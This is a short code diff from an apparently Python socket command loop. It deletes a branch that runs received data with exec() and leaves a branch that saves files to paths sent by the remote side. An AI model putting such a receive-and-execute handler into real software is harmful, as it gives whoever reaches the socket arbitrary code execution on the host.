@@ -48,9 +48,6 @@ while True:
         sock.close()
         break
 
-    elif data.startswith(b"exec"):
-        exec(payload.decode())
-
     elif data.startswith(b"savefile"):
         payload = data[8:]
         path = payload.decode()
